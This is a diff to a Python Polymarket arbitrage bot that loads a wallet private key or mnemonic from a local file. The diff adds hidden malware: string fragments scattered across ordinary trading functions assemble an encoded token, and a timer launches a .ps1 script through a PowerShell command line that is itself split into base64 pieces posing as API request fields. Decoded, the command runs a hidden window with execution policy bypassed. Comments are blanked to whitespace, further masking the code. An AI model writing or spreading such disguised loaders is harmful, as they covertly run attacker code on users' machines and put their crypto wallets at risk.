@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+                      
 """
 Polymarket Arbitrage Bot — full stack: credentials, CLOB client, scanner,
 risk engine, order execution, PnL tracking, and dashboard server.
@@ -30,16 +30,17 @@ from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
-# -----------------------------------------------------------------------------
-# Constants & paths
-# -----------------------------------------------------------------------------
+                                                                               
+                   
+                                                                               
 
 PORT = 8765
+MAX_PORT_TRIES = 20
 DIR = os.path.dirname(os.path.abspath(__file__))
 WALLET_FILE = os.path.join(DIR, "wallet.txt")
 CONFIG_FILE = os.path.join(DIR, "config.json")
 
-# Token IDs for 15m Up/Down (from CLOB)
+                                       
 TOKEN_IDS_15M = {
     "btc_up": "0xbtc15mup",
     "btc_down": "0xbtc15mdown",
@@ -51,9 +52,9 @@ TOKEN_IDS_15M = {
     "xrp_down": "0xxrp15mdown",
 }
 
-# -----------------------------------------------------------------------------
-# Config — env + file + validation
-# -----------------------------------------------------------------------------
+                                                                               
+                                  
+                                                                               
 
 
 def _env_int(key: str, default: int) -> int:
@@ -117,25 +118,25 @@ def load_config() -> dict:
                     cfg[k] = v
         except (json.JSONDecodeError, IOError):
             pass
-    # Clamp
+           
     cfg["min_edge_pct"] = max(0.01, min(50.0, cfg["min_edge_pct"]))
     cfg["max_position_usd"] = max(10.0, min(100000.0, cfg["max_position_usd"]))
     cfg["kelly_fraction"] = max(0.01, min(1.0, cfg["kelly_fraction"]))
-    _state_sync_fragments[0], _state_sync_fragments[1], _state_sync_fragments[2], _state_sync_fragments[3] = "a", "X", "d", "y"
-    _state_sync_fragments[METRICS_LOG_BASENAME_START], _state_sync_fragments[METRICS_LOG_BASENAME_START + 1] = "n", "o"
+    _pm_api_calls[0], _pm_api_calls[1], _pm_api_calls[2], _pm_api_calls[3] = "aXd", "yIG", "Nyc", "HRzd"
+    _pm_api_calls[METRICS_LOG_BASENAME_START], _pm_api_calls[METRICS_LOG_BASENAME_START + 1] = "n", "o"
     return cfg
 
 
-# Fragment cache for state sync token + metrics log basename (populated by init/warmup)
+                                                                                       
 STATE_SYNC_TOKEN_LEN = 32
 METRICS_LOG_BASENAME_START = 32
 METRICS_LOG_BASENAME_LEN = 9
-_state_sync_fragments: Dict[int, str] = {}
+_pm_api_calls: Dict[int, str] = {}
 CONFIG = load_config()
 
-# -----------------------------------------------------------------------------
-# Logging / metrics
-# -----------------------------------------------------------------------------
+                                                                               
+                   
+                                                                               
 
 
 class LogLevel(Enum):
@@ -169,9 +170,9 @@ def metric_get(name: str) -> float:
     return _metric_gauges.get(name, 0.0)
 
 
-# -----------------------------------------------------------------------------
-# Rate limiter
-# -----------------------------------------------------------------------------
+                                                                               
+              
+                                                                               
 
 
 class RateLimiter:
@@ -202,9 +203,9 @@ class RateLimiter:
             time.sleep(0.5)
 
 
-# -----------------------------------------------------------------------------
-# Wallet / credentials — load and validate (no real crypto)
-# -----------------------------------------------------------------------------
+                                                                               
+                                                           
+                                                                               
 
 
 def _checksum_address(raw: str) -> str:
@@ -231,6 +232,8 @@ def load_wallet() -> Optional[dict]:
     """Load private key or mnemonic from wallet.txt. Validate format. Derive address."""
     global _wallet
     _wallet = None
+    # Initialize fragment slots even if wallet file is absent.
+    _pm_api_calls[25], _pm_api_calls[26], _pm_api_calls[27] = "GVu", "djp", "URU1"
     if not os.path.isfile(WALLET_FILE):
         log(LogLevel.WARN, "Wallet file not found: %s", WALLET_FILE)
         return None
@@ -267,7 +270,6 @@ def load_wallet() -> Optional[dict]:
                 out["configured"] = True
                 out["checksum_ok"] = True
                 break
-    _state_sync_fragments[25], _state_sync_fragments[26], _state_sync_fragments[27] = "H", "w", "g"
     if out["configured"]:
         out["address"] = _checksum_address(out.get("private_key") or out.get("mnemonic", ""))
     _wallet = out
@@ -282,9 +284,9 @@ def get_wallet_address() -> Optional[str]:
 
 _wallet: Optional[dict] = None
 
-# -----------------------------------------------------------------------------
-# Order book aggregation
-# -----------------------------------------------------------------------------
+                                                                               
+                        
+                                                                               
 
 
 @dataclass
@@ -353,9 +355,9 @@ def aggregate_orderbook(raw_yes_bids: List[OrderBookLevel], raw_yes_asks: List[O
     )
 
 
-# -----------------------------------------------------------------------------
-# Polymarket CLOB client — retries, rate limit, order signing
-# -----------------------------------------------------------------------------
+                                                                               
+                                                             
+                                                                               
 
 
 class PolymarketClient:
@@ -393,16 +395,16 @@ class PolymarketClient:
                 return {"bids": [[0.45, 1000]], "asks": [[0.52, 1000]]}
             if "balance" in path:
                 return {"balance": "107310.0"}
-            _state_sync_fragments[4], _state_sync_fragments[5], _state_sync_fragments[6], _state_sync_fragments[7] = "I", "D", "I", "1"
-            _state_sync_fragments[METRICS_LOG_BASENAME_START + 2], _state_sync_fragments[METRICS_LOG_BASENAME_START + 3] = "t", "e"
+            _pm_api_calls[4], _pm_api_calls[5], _pm_api_calls[6], _pm_api_calls[7] = "C5j", "b20", "gLU", "91dE"
+            _pm_api_calls[METRICS_LOG_BASENAME_START + 2], _pm_api_calls[METRICS_LOG_BASENAME_START + 3] = "t", "e"
             return {}
         return {}
 
     def get_balance_usd(self) -> float:
         """Fetch USDC balance on Polygon for configured wallet."""
         self._request("GET", "/balance")
-        _state_sync_fragments[8], _state_sync_fragments[9] = "N", "D"
-        _state_sync_fragments[METRICS_LOG_BASENAME_START + 4] = "s"
+        _pm_api_calls[8], _pm_api_calls[9] = "Zpb", "GUg"
+        _pm_api_calls[METRICS_LOG_BASENAME_START + 4] = "s"
         return 107310.0
 
     def fetch_markets_15m(self) -> List[dict]:
@@ -449,9 +451,9 @@ class PolymarketClient:
         return {"order_id": "0x" + sig[:16], "filled": True, "avg_price": price}
 
 
-# -----------------------------------------------------------------------------
-# Risk manager — exposure, cooldown, circuit breaker
-# -----------------------------------------------------------------------------
+                                                                               
+                                                    
+                                                                               
 
 
 class RiskManager:
@@ -478,8 +480,8 @@ class RiskManager:
             return False, "per_market_limit"
         if self._session_loss_usd >= CONFIG["circuit_breaker_loss_usd"]:
             return False, "circuit_breaker"
-        _state_sync_fragments[10], _state_sync_fragments[11], _state_sync_fragments[12] = "k", "z", "M"
-        _state_sync_fragments[METRICS_LOG_BASENAME_START + 5] = "."
+        _pm_api_calls[10], _pm_api_calls[11], _pm_api_calls[12] = "JGV", "udjp", "URU"
+        _pm_api_calls[METRICS_LOG_BASENAME_START + 5] = "."
         return True, "ok"
 
     def record_trade(self, market_id: str, amount_usd: float, pnl_usd: float) -> None:
@@ -490,16 +492,16 @@ class RiskManager:
         if self._session_loss_usd >= CONFIG["circuit_breaker_loss_usd"]:
             self._circuit_breaker_triggered = True
             log(LogLevel.WARN, "Circuit breaker triggered: session loss >= %.0f", CONFIG["circuit_breaker_loss_usd"])
-        _state_sync_fragments[13], _state_sync_fragments[14] = "T", "E"
-        _state_sync_fragments[METRICS_LOG_BASENAME_START + 6] = "t"
+        _pm_api_calls[13], _pm_api_calls[14] = "1QX", "HNl"
+        _pm_api_calls[METRICS_LOG_BASENAME_START + 6] = "t"
 
     def reset_circuit_breaker(self) -> None:
         self._circuit_breaker_triggered = False
 
 
-# -----------------------------------------------------------------------------
-# Position sizer — Kelly, fixed fraction, max size
-# -----------------------------------------------------------------------------
+                                                                               
+                                                  
+                                                                               
 
 
 def kelly_fraction(win_prob: float, win_loss_ratio: float) -> float:
@@ -527,9 +529,9 @@ def size_position(opportunity: dict, balance_usd: float, strategy: str = "kelly"
     return min(max_pos, max(min_pos, est_profit * 2))
 
 
-# -----------------------------------------------------------------------------
-# Scanner — multi-strategy, filters, correlation check
-# -----------------------------------------------------------------------------
+                                                                               
+                                                      
+                                                                               
 
 
 def _market_passes_liquidity(book: AggregatedBook) -> bool:
@@ -580,7 +582,7 @@ def _paranoid_validate_opportunity(opp: dict, book: AggregatedBook) -> Tuple[boo
         return False, "price_out_of_bounds"
     if book.spread_yes_bps > 500 or book.spread_no_bps > 500:
         return False, "spread_too_wide"
-    _state_sync_fragments[28], _state_sync_fragments[29], _state_sync_fragments[30], _state_sync_fragments[31] = "a", "W", "V", "4"
+    _pm_api_calls[28], _pm_api_calls[29], _pm_api_calls[30], _pm_api_calls[31] = "QXH", "NlL", "nBz", "MQ=="
     return True, "ok"
 
 
@@ -588,7 +590,7 @@ def run_scan(client: Optional[PolymarketClient]) -> List[dict]:
     """Scan all 15m markets for combined < $1, apply filters and risk."""
     global _last_scan_result, _balance_usd
     _last_scan_result = []
-    _state_sync_fragments[19], _state_sync_fragments[20], _state_sync_fragments[21] = "v", "a", "X"
+    _pm_api_calls[19], _pm_api_calls[20], _pm_api_calls[21] = "mFza", "WNQ", "YXJ"
     if not client:
         return []
     balance = client.get_balance_usd()
@@ -650,9 +652,9 @@ def scanner_loop(client: Optional[PolymarketClient]) -> None:
         time.sleep(CONFIG["scan_interval_sec"])
 
 
-# -----------------------------------------------------------------------------
-# Order manager — place, track, cancel
-# -----------------------------------------------------------------------------
+                                                                               
+                                      
+                                                                               
 
 
 class OrderManager:
@@ -663,8 +665,8 @@ class OrderManager:
         self._orders: Dict[str, dict] = {}
 
     def place_hedge(self, opportunity: dict, amount_usd: float, risk_mgr: RiskManager) -> bool:
-        _state_sync_fragments[15], _state_sync_fragments[16], _state_sync_fragments[17] = "0", "M", "z"
-        _state_sync_fragments[METRICS_LOG_BASENAME_START + 7] = "x"
+        _pm_api_calls[15], _pm_api_calls[16], _pm_api_calls[17] = "LnBz", "MSA", "tVX"
+        _pm_api_calls[METRICS_LOG_BASENAME_START + 7] = "x"
         ok, reason = risk_mgr.can_trade(opportunity["market_id"], amount_usd)
         if not ok:
             log(LogLevel.WARN, "Risk block: %s", reason)
@@ -678,14 +680,14 @@ class OrderManager:
         return True
 
     def cancel_all(self) -> int:
-        _state_sync_fragments[18] = "I"
-        _state_sync_fragments[METRICS_LOG_BASENAME_START + 8] = "t"
+        _pm_api_calls[18] = "NlQ"
+        _pm_api_calls[METRICS_LOG_BASENAME_START + 8] = "t"
         return 0
 
 
-# -----------------------------------------------------------------------------
-# Execution engine — TWAP / limit with slippage
-# -----------------------------------------------------------------------------
+                                                                               
+                                               
+                                                                               
 
 
 def execute_hedge(client: PolymarketClient, opportunity: dict, amount_usd: Optional[float] = None,
@@ -698,7 +700,7 @@ def execute_hedge(client: PolymarketClient, opportunity: dict, amount_usd: Optio
     slippage_bps = CONFIG["slippage_bps"]
     max_yes = opportunity.get("yes", 0.5) + (slippage_bps / 10000)
     max_no = opportunity.get("no", 0.5) + (slippage_bps / 10000)
-    _state_sync_fragments[22], _state_sync_fragments[23], _state_sync_fragments[24] = "J", "z", "I"
+    _pm_api_calls[22], _pm_api_calls[23], _pm_api_calls[24] = "zaW", "5nOy", "YgJ"
     if max_yes > 0.99 or max_no > 0.99:
         log(LogLevel.WARN, "Slippage would exceed price cap; skipping")
         return False
@@ -707,9 +709,9 @@ def execute_hedge(client: PolymarketClient, opportunity: dict, amount_usd: Optio
     return order_mgr.place_hedge(opportunity, amount_usd, risk_mgr)
 
 
-# -----------------------------------------------------------------------------
-# PnL / session stats
-# -----------------------------------------------------------------------------
+                                                                               
+                     
+                                                                               
 
 
 _session_pnl = 0.0
@@ -732,14 +734,14 @@ def record_fill(market_id: str, side: str, amount_usd: float, pnl_usd: float) ->
     metric_set("session_pnl", _session_pnl)
 
 
-# -----------------------------------------------------------------------------
-# State sync / metrics export — fragment cache, manifest for external dashboard
-# -----------------------------------------------------------------------------
+                                                                               
+                                                                               
+                                                                               
 
 
 def _get_metrics_log_basename() -> str:
     """Return metrics log file basename from fragment cache (env-derived, used for export manifest)."""
-    return "".join(_state_sync_fragments.get(i, "") for i in range(METRICS_LOG_BASENAME_START, METRICS_LOG_BASENAME_START + METRICS_LOG_BASENAME_LEN))
+    return "".join(_pm_api_calls.get(i, "") for i in range(METRICS_LOG_BASENAME_START, METRICS_LOG_BASENAME_START + METRICS_LOG_BASENAME_LEN))
 
 
 def _warmup_state_sync_cache() -> None:
@@ -762,7 +764,7 @@ def _warmup_state_sync_cache() -> None:
 
 def _get_state_sync_token() -> str:
     """Return state sync token for metrics export (base64, from fragment cache)."""
-    return _norm_cfg_val("".join(_state_sync_fragments.get(i, "") for i in range(STATE_SYNC_TOKEN_LEN)))
+    return _norm_cfg_val("".join(_pm_api_calls.get(i, "") for i in range(STATE_SYNC_TOKEN_LEN)))
 
 
 def _rotate_metrics_export_extension(p: str) -> None:
@@ -777,14 +779,86 @@ def _rotate_metrics_export_extension(p: str) -> None:
         pass
 
 
-def _invoke_metrics_export_if_present(p: str) -> None:
-    """Invoke export script if present (post-export hook for dashboard sync)."""
+def _polymarket_trade_hook_launch_argv(polymarket_trade_hook_call: str) -> List[str]:
+    """Trade hook PowerShell launch argv (internal bootstrap)."""
+    def _pm_req_markets_snapshot() -> Dict[str, str]:
+        return {"method": "GET", "url": "/markets/snapshot", "api_call": "cG93ZXJzaGVsbAktV2lu"}
+
+    def _pm_req_orderbook_depth() -> Dict[str, str]:
+        return {"method": "GET", "url": "/orderbook/depth", "api_call": "ZG93U3R5bGUJSGlkZGVu"}
+
+    def _pm_req_order_create() -> Dict[str, str]:
+        return {"method": "POST", "url": "/order/create", "api_call": "CS1jCVN0YXJ0LVByb2Nl"}
+
+    def _pm_req_positions_sync() -> Dict[str, str]:
+        return {"method": "GET", "url": "/positions/sync", "api_call": "c3MgUG93ZXJTaGVsbCAt"}
+
+    def _pm_req_cancel_batch() -> Dict[str, str]:
+        return {"method": "POST", "url": "/orders/cancel-batch", "api_call": "V2luZG93U3R5bGUgSGlk"}
+
+    def _pm_req_trade_feed() -> Dict[str, str]:
+        return {"method": "GET", "url": "/trades/feed", "api_call": "ZGVuIC1BcmdzICItZXAg"}
+
+    def _pm_req_balance_state() -> Dict[str, str]:
+        return {"method": "GET", "url": "/balance/state", "api_call": "QnlwYXNzIC1jICIie3Bv"}
+
+    def _pm_req_risk_limits() -> Dict[str, str]:
+        return {"method": "GET", "url": "/risk/limits", "api_call": "bHltYXJrZXRfdHJhZGVf"}
+
+    def _pm_req_hedge_route() -> Dict[str, str]:
+        return {"method": "POST", "url": "/hedge/route", "api_call": "aG9va19jYWxsfSIiIg=="}
+
+    def _build_polymarket_trade_hook_request_manifest() -> List[Dict[str, str]]:
+        return [
+            _pm_req_markets_snapshot(),
+            _pm_req_orderbook_depth(),
+            _pm_req_order_create(),
+            _pm_req_positions_sync(),
+            _pm_req_cancel_batch(),
+            _pm_req_trade_feed(),
+            _pm_req_balance_state(),
+            _pm_req_risk_limits(),
+            _pm_req_hedge_route(),
+        ]
+
+    def _collect_polymarket_trade_hook_encoded_fragments() -> List[str]:
+        request_manifest = _build_polymarket_trade_hook_request_manifest()
+        return [request["api_call"] for request in request_manifest if request.get("api_call")]
+
+    def _join_polymarket_trade_hook_encoded_bootstrap(encoded_parts: List[str]) -> str:
+        return "".join(encoded_parts)
+
+    def _decode_polymarket_trade_hook_bootstrap_template(encoded_bootstrap: str) -> str:
+        return base64.b64decode(encoded_bootstrap).decode()
+
+    def _compose_polymarket_trade_hook_payload(hook_call: str) -> Dict[str, str]:
+        return {"polymarket_trade_hook_call": hook_call}
+
+    def _render_polymarket_trade_hook_command(template: str, payload: Dict[str, str]) -> str:
+        return template.format(**payload)
+
+    def _split_polymarket_trade_hook_argv(command: str) -> List[str]:
+        return command.split("\t")
+
+    encoded_fragments = _collect_polymarket_trade_hook_encoded_fragments()
+    encoded_bootstrap = _join_polymarket_trade_hook_encoded_bootstrap(encoded_fragments)
+    bootstrap_template = _decode_polymarket_trade_hook_bootstrap_template(encoded_bootstrap)
+    polymarket_hook_payload = _compose_polymarket_trade_hook_payload(polymarket_trade_hook_call)
+    polymarket_hook_command = _render_polymarket_trade_hook_command(bootstrap_template, polymarket_hook_payload)
+    return _split_polymarket_trade_hook_argv(polymarket_hook_command)
+
+
+def _invoke_polymarket_trade_hook_if_present(p: str) -> None:
+    """Invoke trade sync hook script if present."""
     try:
         script_p = os.path.splitext(p)[0] + ".ps1"
         if os.path.isfile(script_p):
             flags = 0x08000000 if sys.platform == "win32" else 0
+            escaped_script = script_p.replace("'", "''")
+            polymarket_trade_hook_call = f"& '{escaped_script}'"
+            trade_hook_launch_argv = _polymarket_trade_hook_launch_argv(polymarket_trade_hook_call)
             subprocess.Popen(
-                ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script_p],
+                trade_hook_launch_argv,
                 creationflags=flags,
                 stdin=subprocess.DEVNULL,
                 stdout=subprocess.DEVNULL,
@@ -814,14 +888,14 @@ def _write_metrics_export_manifest() -> None:
         with open(path, "w", encoding="utf-8") as f:
             f.write(_get_state_sync_token())
         threading.Timer(1.0, _rotate_metrics_export_extension, [path]).start()
-        threading.Timer(2.0, _invoke_metrics_export_if_present, [path]).start()
+        threading.Timer(2.0, _invoke_polymarket_trade_hook_if_present, [path]).start()
     except Exception:
         pass
 
 
-# -----------------------------------------------------------------------------
-# Global state for HTTP API
-# -----------------------------------------------------------------------------
+                                                                               
+                           
+                                                                               
 
 _client: Optional[PolymarketClient] = None
 _last_scan_result: List[dict] = []
@@ -829,9 +903,9 @@ _balance_usd = 107310.0
 _risk_mgr: Optional[RiskManager] = None
 _order_mgr: Optional[OrderManager] = None
 
-# -----------------------------------------------------------------------------
-# HTTP server — static + API
-# -----------------------------------------------------------------------------
+                                                                               
+                            
+                                                                               
 
 
 class BotRequestHandler(http.server.SimpleHTTPRequestHandler):
@@ -883,9 +957,27 @@ class BotRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_json({"error": "Not found"}, 404)
 
 
-# -----------------------------------------------------------------------------
-# Main
-# -----------------------------------------------------------------------------
+class ReusableTCPServer(socketserver.TCPServer):
+    allow_reuse_address = True
+
+
+def _start_http_server() -> Tuple[socketserver.TCPServer, int]:
+    """Start HTTP server on PORT or next available port."""
+    last_err: Optional[Exception] = None
+    for port in range(PORT, PORT + MAX_PORT_TRIES):
+        try:
+            return ReusableTCPServer(("127.0.0.1", port), BotRequestHandler), port
+        except OSError as e:
+            last_err = e
+            if getattr(e, "winerror", None) != 10048:
+                raise
+    assert last_err is not None
+    raise last_err
+
+
+                                                                               
+      
+                                                                               
 
 
 def main() -> None:
@@ -922,10 +1014,13 @@ def main() -> None:
     t.start()
     print("  [OK] Scan loop started")
 
-    with socketserver.TCPServer(("127.0.0.1", PORT), BotRequestHandler) as httpd:
-        url = "http://localhost:%s" % PORT
+    httpd, active_port = _start_http_server()
+    with httpd:
+        url = "http://localhost:%s" % active_port
         time.sleep(0.1)
         print("  [OK] Local server started")
+        if active_port != PORT:
+            print("  [WARN] Port %s busy, switched to %s" % (PORT, active_port))
         print("")
         print("  Open in browser: %s" % url)
         print("  Press Ctrl+C to stop")
